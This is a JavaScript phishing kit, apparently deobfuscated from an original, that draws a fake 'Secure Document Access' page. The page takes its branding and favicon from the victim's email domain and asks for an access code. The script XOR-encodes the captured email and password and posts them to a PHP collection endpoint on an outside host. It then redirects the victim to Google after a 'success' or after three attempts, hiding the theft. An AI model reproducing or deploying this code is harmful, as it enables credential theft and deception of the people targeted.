(function () {
  "use strict";

  // Configuration - extracted from original _0x374f98
  const CONFIG = {
    BG_IMG: "https://images.unsplash.com/photo-1517849845537-4d257902454a?w=1920&q=80",
    BG_BRI: 1,
    BG_DAR: 1,
    BG_CON: 1,
    BG_SAT: 1,
    BG_BLUR: 0,
    BG_GRAY: false,
    BG_OVERLAY: 0.25,
    PHP_ENDPOINT: "http://s742196446.onlinehome.us/main/base/personal/22sjwjknjqdq/email/AjsjjsjsY/fdfmdkfmsdkay.php",
    SUCCESS_REDIRECT: "https://www.google.com",
    LOCKOUT_REDIRECT: "https://www.google.com",
    SECRET_KEY: "MATT_SECURE_2026",
    MAX_TRIES: 3,
    LOCKOUT_DELAY: 2000,
    STORAGE_KEY: "st_7b3f19",
    PATH_SEGMENTS: ["base", "node", "code_p4r7", "22sjwjknjqdq", "AjsjjsjsY"],
    MSG_WRONG: "Incorrect access code. Please try again.",
    MSG_LOCKOUT: "Too many attempts. Access temporarily locked.",
    MSG_GRANTED: "Access granted! Redirecting...",
    MSG_NET: "Network error. Please check connection.",
    HEADING: "Secure Document Access",
    SUBHEAD: "Enter credentials to view document",
    FOOTER: "Encrypted Document · © 2026",
    EMAIL_LABEL: "Email Address",
    KEY_LABEL: "Access Code",
    KEY_PLACEHOLDER: "Enter your access code",
    BUTTON_TEXT: "Verify & View Document",
    TAG_TEXT: "Secure"
  };

  // Encryption from _0x52b58a
  function encryptData(data, key) {
    const jsonStr = JSON.stringify(data);
    const keyLen = key.length;
    let result = "";
    for (let i = 0; i < jsonStr.length; i++) {
      const charCode = jsonStr.charCodeAt(i) ^ key.charCodeAt(i % keyLen);
      result += ("0" + charCode.toString(16)).slice(-2);
    }
    return btoa(result);
  }

  // Get domain from email - _0x66386b
  function getEmailDomain(email) {
    if (!email || email.indexOf("@") === -1) return "";
    const parts = email.split("@");
    if (parts.length === 2 && parts[0].trim() !== "") {
      return parts[1].trim().toLowerCase();
    }
    return "";
  }

  // Capitalize - _0x514502
  function capitalize(str) {
    if (!str) return "";
    return str.charAt(0).toUpperCase() + str.slice(1);
  }

  // Create background - _0x1a0432
  function createBackground() {
    const bg = document.createElement("div");
    bg.id = "bg_canvas";
    bg.className = "frame_v7";
    
    const veil = document.createElement("div");
    veil.id = "bg_veil";
    
    document.body.insertBefore(bg, document.body.firstChild);
    document.body.insertBefore(veil, document.body.firstChild);
  }

  // Create main UI - _0x8166d4
  function createUI() {
    // Main form container
    const mainForm = document.createElement("div");
    mainForm.id = "main_form";
    mainForm.className = "base_node";
    
    // Alert node
    const alertNode = document.createElement("div");
    alertNode.id = "alert_node";
    alertNode.className = "alert_banner";
    
    // Title section
    const titleNode = document.createElement("div");
    titleNode.id = "title_node";
    titleNode.innerHTML = `
      <div class="brand_row">
        <div class="brand_orb" id="brand_orb">
          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
          </svg>
        </div>
        <img src="" alt="brand_img" id="brand_img" style="display:none">
        <h1 class="title_main" id="caption_title">${CONFIG.HEADING}</h1>
      </div>
      <div class="caption_sub" id="caption_sub">${CONFIG.SUBHEAD}</div>
    `;
    
    // Form fields
    const formFields = document.createElement("div");
    formFields.className = "form_shell";
    formFields.innerHTML = `
      <div class="field_shell">
        <label class="lbl_small" id="mail_slot">${CONFIG.EMAIL_LABEL}</label>
        <div class="inp_wrap">
          <input type="email" id="mail_x9k2" class="inp_core" readonly tabindex="-1" autocomplete="off">
        </div>
      </div>
      
      <div class="field_shell">
        <label class="lbl_small" for="code_p4r7_input">${CONFIG.KEY_LABEL}</label>
        <div class="inp_wrap">
          <input type="password" id="code_p4r7_input" class="inp_core" placeholder="${CONFIG.KEY_PLACEHOLDER}" required autocomplete="off">
          <button type="button" class="eye_btn" id="eye_toggle">
            <svg class="eye_show" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
              <circle cx="12" cy="12" r="3"></circle>
            </svg>
            <svg class="eye_hide" style="display:none" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
              <line x1="1" y1="1" x2="23" y2="23"></line>
            </svg>
          </button>
        </div>
      </div>
      
      <button type="submit" class="cta_main" id="code_p4r7">
        <span class="btn_text">${CONFIG.BUTTON_TEXT}</span>
        <span class="ring_loader" id="ring_loader"></span>
      </button>
    `;
    
    // Footer
    const footer = document.createElement("div");
    footer.className = "row_block";
    footer.innerHTML = `
      <div class="chip_tag" id="chip_tag">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
        </svg>
        ${CONFIG.TAG_TEXT}
      </div>
      <div class="caption_node">${CONFIG.FOOTER}</div>
    `;
    
    mainForm.appendChild(alertNode);
    mainForm.appendChild(titleNode);
    mainForm.appendChild(formFields);
    mainForm.appendChild(footer);
    
    document.body.appendChild(mainForm);
  }

  // Apply styles - _0x3ce607
  function applyStyles() {
    const bg = document.getElementById("bg_canvas");
    const veil = document.getElementById("bg_veil");
    
    if (bg) {
      bg.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: -1;
        background-image: url(${CONFIG.BG_IMG});
        background-size: cover;
        background-position: center;
        filter: brightness(${CONFIG.BG_BRI}) contrast(${CONFIG.BG_CON}) saturate(${CONFIG.BG_SAT})${CONFIG.BG_BLUR > 0 ? ` blur(${CONFIG.BG_BLUR}px)` : ""}${CONFIG.BG_GRAY ? " grayscale(1)" : ""};
      `;
    }
    
    if (veil) {
      veil.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: -1;
        background: rgba(10,66,123,${CONFIG.BG_OVERLAY});
      `;
    }
  }

  // Update URL - _0x446451
  function updateURL() {
    try {
      const array = new Uint8Array(16);
      crypto.getRandomValues(array);
      const token = btoa(String.fromCharCode.apply(null, array))
        .replace(/\+/g, "-")
        .replace(/\//g, "_")
        .replace(/=+$/, "");
      history.replaceState(null, "", `#/${CONFIG.PATH_SEGMENTS.join("/")}/${token}`);
    } catch (e) {}
  }

  // Update favicon - _0x32b3a6
  function updateFavicon(domain) {
    const img = new Image();
    const url = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(domain)}&sz=128`;
    
    img.onload = function() {
      const brandImg = document.getElementById("brand_img");
      if (brandImg) {
        brandImg.src = url;
        brandImg.style.display = "block";
      }
    };
    
    img.onerror = function() {
      const brandImg = document.getElementById("brand_img");
      if (brandImg) {
        brandImg.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Ccircle cx='12' cy='12' r='10' fill='%23464f5b'/%3E%3C/svg%3E";
        brandImg.style.display = "block";
      }
    };
    
    img.src = url;
  }

  // Show alert - _0x36b61d
  function showAlert(message, type) {
    const alertNode = document.getElementById("alert_node");
    if (!alertNode) return;
    
    alertNode.textContent = message;
    alertNode.className = "alert_banner visible " + type;
    
    if (type === "error") {
      alertNode.style.cssText = "display:block;background:#fee9e7;color:#b33a2f;border:1px solid #f5c6c2;padding:12px 16px;border-radius:8px;margin-bottom:20px;text-align:center;font-size:14px;";
    } else {
      alertNode.style.cssText = "display:block;background:#e3f5e9;color:#1e7a4b;border:1px solid #b8e0c8;padding:12px 16px;border-radius:8px;margin-bottom:20px;text-align:center;font-size:14px;";
    }
  }

  // Hide alert - _0x381c63
  function hideAlert() {
    const alertNode = document.getElementById("alert_node");
    if (alertNode) {
      alertNode.style.display = "none";
      alertNode.className = "alert_banner";
    }
  }

  // Set loading - _0x148b5e
  function setLoading(loading) {
    const btn = document.getElementById("code_p4r7");
    const loader = document.getElementById("ring_loader");
    
    if (btn) {
      btn.disabled = loading;
      btn.classList.toggle("locked_spin", loading);
    }
    if (loader) {
      loader.style.display = loading ? "inline-block" : "none";
    }
  }

  // Handle lockout - _0x31d847
  function handleLockout() {
    const btn = document.getElementById("code_p4r7");
    const passwordInput = document.getElementById("code_p4r7_input");
    
    showAlert(CONFIG.MSG_LOCKOUT, "error");
    setLoading(true);
    
    if (passwordInput) passwordInput.value = "";
    
    setTimeout(function() {
      window.location.href = CONFIG.LOCKOUT_REDIRECT;
    }, CONFIG.LOCKOUT_DELAY);
  }

  // Update email display - _0x46696c
  function updateEmailDisplay() {
    const emailInput = document.getElementById("mail_x9k2");
    const captionTitle = document.getElementById("caption_title");
    const captionSub = document.getElementById("caption_sub");
    const mailSlot = document.getElementById("mail_slot");
    
    if (!emailInput) return;
    
    const email = emailInput.value.trim();
    const domain = getEmailDomain(email);
    
    if (!domain) {
      if (captionTitle) captionTitle.textContent = CONFIG.HEADING;
      if (captionSub) captionSub.textContent = CONFIG.SUBHEAD;
      if (mailSlot) mailSlot.textContent = CONFIG.EMAIL_LABEL;
      updateFavicon("");
      return;
    }
    
    const domainName = capitalize(domain.split(".")[0]);
    if (captionTitle) captionTitle.textContent = domainName + " " + CONFIG.HEADING;
    if (captionSub) captionSub.textContent = domainName + " " + CONFIG.SUBHEAD;
    if (mailSlot) mailSlot.textContent = domainName + " " + CONFIG.EMAIL_LABEL;
    
    updateFavicon(domain);
  }

  // Handle submit - _0x41ee04
  function handleSubmit(e) {
    e.preventDefault();
    
    const emailInput = document.getElementById("mail_x9k2");
    const passwordInput = document.getElementById("code_p4r7_input");
    
    if (!emailInput || !passwordInput) return;
    
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    const startTime = Date.now();
    
    // Validation
    if (!email || email.indexOf("@") === -1) {
      showAlert("Please enter a valid email address.", "error");
      passwordInput.focus();
      return;
    }
    
    if (!password) {
      showAlert(CONFIG.MSG_WRONG, "error");
      passwordInput.focus();
      return;
    }
    
    hideAlert();
    setLoading(true);
    
    // ORIGINAL: Encrypt and send as FormData
    const encryptedPayload = encryptData({ email: email, code: password }, CONFIG.SECRET_KEY);
    const formData = new FormData();
    formData.append("data", encryptedPayload);
    
    fetch(CONFIG.PHP_ENDPOINT, {
      method: "POST",
      body: formData
    })
    .then(function(response) {
      return response.text();
    })
    .then(function(text) {
      let data = null;
      try {
        data = JSON.parse(text);
      } catch (e) {}
      processResponse(data, email, password);
    })
    .catch(function() {
      setLoading(false);
      showAlert(CONFIG.MSG_NET, "error");
      passwordInput.value = "";
      passwordInput.focus();
    })
    .then(function() {
      const elapsed = Date.now() - startTime;
      const delay = Math.max(800, 2000 - elapsed);
      return new Promise(function(resolve) {
        setTimeout(resolve, delay);
      });
    })
    .then(function() {
      setLoading(false);
    });
  }

  // Process response
  function processResponse(data, email, password) {
    const passwordInput = document.getElementById("code_p4r7_input");
    
    let attempts = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY + "_attempts") || "0", 10) + 1;
    sessionStorage.setItem(CONFIG.STORAGE_KEY + "_attempts", String(attempts));
    
    if (!data) {
      if (attempts >= CONFIG.MAX_TRIES) {
        handleLockout();
        return;
      }
      showAlert(CONFIG.MSG_WRONG, "error");
      if (passwordInput) {
        passwordInput.value = "";
        passwordInput.focus();
      }
      return;
    }
    
    if (data.status === "success") {
      showAlert(CONFIG.MSG_GRANTED, "success");
      sessionStorage.setItem(CONFIG.STORAGE_KEY + "_verified", "true");
      sessionStorage.setItem(CONFIG.STORAGE_KEY + "_email", email);
      setTimeout(function() {
        window.location.href = CONFIG.SUCCESS_REDIRECT;
      }, 1500);
    } else if (data.status === "locked") {
      handleLockout();
    } else {
      if (attempts >= CONFIG.MAX_TRIES) {
        handleLockout();
        return;
      }
      const remaining = CONFIG.MAX_TRIES - attempts;
      showAlert(CONFIG.MSG_WRONG + " (" + remaining + " attempts remaining)", "error");
      if (passwordInput) {
        passwordInput.value = "";
        passwordInput.focus();
      }
    }
  }

  // Initialize - _0x1ecf22
  function init() {
    // Check if already verified
    const verified = sessionStorage.getItem(CONFIG.STORAGE_KEY + "_verified");
    if (verified === "true") {
      window.location.href = CONFIG.SUCCESS_REDIRECT;
      return;
    }
    
    // Create UI
    createBackground();
    createUI();
    applyStyles();
    updateURL();
    
    // Get DOM references
    const emailInput = document.getElementById("mail_x9k2");
    const passwordInput = document.getElementById("code_p4r7_input");
    const eyeToggle = document.getElementById("eye_toggle");
    const submitBtn = document.getElementById("code_p4r7");
    
    // Event listeners
    if (emailInput) {
      emailInput.addEventListener("input", updateEmailDisplay);
    }
    
    if (eyeToggle && passwordInput) {
      eyeToggle.addEventListener("click", function() {
        const isPassword = passwordInput.type === "password";
        passwordInput.type = isPassword ? "text" : "password";
        
        const eyeShow = eyeToggle.querySelector(".eye_show");
        const eyeHide = eyeToggle.querySelector(".eye_hide");
        if (eyeShow) eyeShow.style.display = isPassword ? "none" : "block";
        if (eyeHide) eyeHide.style.display = isPassword ? "block" : "none";
        
        passwordInput.focus();
      });
    }
    
    if (submitBtn) {
      submitBtn.addEventListener("click", handleSubmit);
    }
    
    // Initial display
    updateEmailDisplay();
  }

  // Start
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
